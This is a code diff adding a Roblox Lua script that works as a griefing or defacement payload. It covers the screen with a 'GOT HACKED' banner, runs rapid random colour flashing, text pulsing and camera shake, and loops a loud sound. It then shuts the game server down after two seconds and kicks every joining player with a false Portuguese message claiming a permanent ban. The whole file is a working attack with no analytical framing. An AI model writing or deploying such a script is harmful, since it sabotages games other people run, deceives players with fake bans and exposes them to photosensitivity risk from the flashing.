@@ -1,0 +1,57 @@
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.ResetOnSpawn = false
+
+local textLabel = Instance.new("TextLabel", gui)
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.Text = "GOT HACKED BY 45%SKIDBYPASSREDs!!!1!!1!!"
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.TextScaled = true
+textLabel.BackgroundTransparency = 1
+textLabel.Font = Enum.Font.FredokaOne
+
+-- Flashing color madness
+spawn(function()
+	while true do
+		textLabel.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
+		textLabel.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
+		textLabel.BackgroundTransparency = math.random() * 0.8
+		textLabel.TextStrokeTransparency = math.random()
+		wait(0.05)
+	end
+end)
+
+-- INSANE pulsing text size
+spawn(function()
+	while true do
+		textLabel.TextSize = math.random(50, 100)
+		wait(0.1)
+	end
+end)
+
+-- RUMBLING SCREEN SHAKE
+spawn(function()
+	local cam = workspace.CurrentCamera
+	while true do
+		local offset = Vector3.new(math.random(-5,5)/10, math.random(-5,5)/10, 0)
+		cam.CFrame = cam.CFrame * CFrame.new(offset)
+		wait(0.03)
+	end
+end)
+
+-- 🔊 Blasting Cool Sound (looped)
+local sound = Instance.new("Sound", gui)
+sound.SoundId = "rbxassetid://18925320031"
+sound.Volume = 5
+sound.Looped = true
+sound:Play()
+
+-- Fechar o jogo após 2 segundos
+wait(2)
+game:Shutdown()
+
+-- Impedir reconexões
+game.Players.PlayerAdded:Connect(function(player)
+    player:Kick("Você foi banido permanentemente.")
+end)
